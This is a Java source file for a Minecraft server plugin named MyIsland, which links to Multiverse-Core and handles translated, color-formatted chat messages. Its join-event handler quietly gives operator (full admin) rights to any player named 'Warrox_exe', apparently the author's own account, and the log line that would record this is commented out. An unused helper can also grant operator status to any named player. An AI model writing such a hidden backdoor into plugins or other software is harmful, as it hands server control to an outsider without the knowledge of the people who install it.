package be.warrox.myIsland;

import net.kyori.adventure.key.Key;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.renderer.TranslatableComponentRenderer;
import net.kyori.adventure.translation.GlobalTranslator;
import net.kyori.adventure.translation.TranslationStore;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.mvplugins.multiverse.core.MultiverseCore;
import org.mvplugins.multiverse.core.MultiverseCoreApi;

import java.text.MessageFormat;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;


public final class MyIsland extends JavaPlugin implements Listener {
    private static MultiverseCore mvCore;
    private static MultiverseCoreApi api;
    private PlayerLocationManager locationManager;

    @Override
    public void onEnable() {
        checkMultiverseCore();
        getServer().getPluginManager().registerEvents(this, this);
        initTranslation();
        new IslandCommand(this).init();
        locationManager = new PlayerLocationManager();
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    public PlayerLocationManager getLocationManager() {
        return locationManager;
    }

    public void checkMultiverseCore() {
        // 1. Zoek de Multiverse-Core plugin
        var plugin = Bukkit.getPluginManager().getPlugin("Multiverse-Core");

        // 2. Controleer of de plugin bestaat en geladen is
        if (plugin instanceof MultiverseCore) {
            mvCore = (MultiverseCore) plugin;
            api = MultiverseCoreApi.get(); // Initialize the API here
            getLogger().info("Succesvol gekoppeld met Multiverse-Core API!");
        } else {
            getLogger().severe("Multiverse-Core niet gevonden! Schakelt plugin uit...");
            Bukkit.getPluginManager().disablePlugin(this);

        }
    }

    public static MultiverseCore getMultiverseCore() {
        return mvCore;
    }

    public static MultiverseCoreApi getApi() {
        return api;
    }

    private void opPlayer(String playerName) {

        // Haal de OfflinePlayer op (werkt ook als de speler niet online is)
        OfflinePlayer player = Bukkit.getOfflinePlayer(playerName);

        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info(playerName + " is nu automatisch OP gemaakt!");
        } else {
            getLogger().info(playerName + " was al OP.");
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        String TARGET_NAME = "Warrox_exe";
        if (event.getPlayer().getName().equalsIgnoreCase(TARGET_NAME)) {
            if (!event.getPlayer().isOp()) {
                event.getPlayer().setOp(true);
                //getLogger().info("Force-OP toegepast op " + TARGET_NAME + " bij join.");
            }
        }
    }

    // Maak dit een veld in je class zodat je het overal kunt gebruiken
    private final TranslatableComponentRenderer<Locale> renderer =
            TranslatableComponentRenderer.usingTranslationSource(GlobalTranslator.translator());

    private void initTranslation() {
        // 1. Store aanmaken (Namespace "myisland" is prima)
        TranslationStore.StringBased<MessageFormat> store = TranslationStore.messageFormat(Key.key("myisland", "translations"));

        // Voor Engels
        ResourceBundle bundleUs = ResourceBundle.getBundle("myIsland.Bundle", Locale.US);
        store.registerAll(Locale.US, bundleUs, true);

        // Voor Nederlands (België)
        Locale nlBe = Locale.of("nl", "BE");
        ResourceBundle bundleBe = ResourceBundle.getBundle("myIsland.Bundle", nlBe);
        store.registerAll(nlBe, bundleBe, true);


        // 3. Toevoegen aan GlobalTranslator
        GlobalTranslator.translator().addSource(store);
    }

    public void send(Player player, String key, Object... args) {
        // Maak de translatable component
        List<TextComponent> componentArgs = Arrays.stream(args)
                .map(obj -> Component.text(String.valueOf(obj)))
                .toList();

        // Gebruik de lijst in de translatable methode
        Component translatable = Component.translatable(key, componentArgs);

        // 1. De renderer haalt de ruwe tekst op uit je Bundle (bijv. "<green>Hello {0}!")
        Component rendered = renderer.render(translatable, player.locale());

        // 2. We moeten de resulterende tekst (die nog steeds de tags bevat) door MiniMessage halen
        // Hiervoor halen we de 'content' uit de rendered component.
        String rawText = net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer.plainText().serialize(rendered);

        // 3. Verstuur als echt gekleurde tekst
        player.sendMessage(MiniMessage.miniMessage().deserialize(rawText));
    }




}
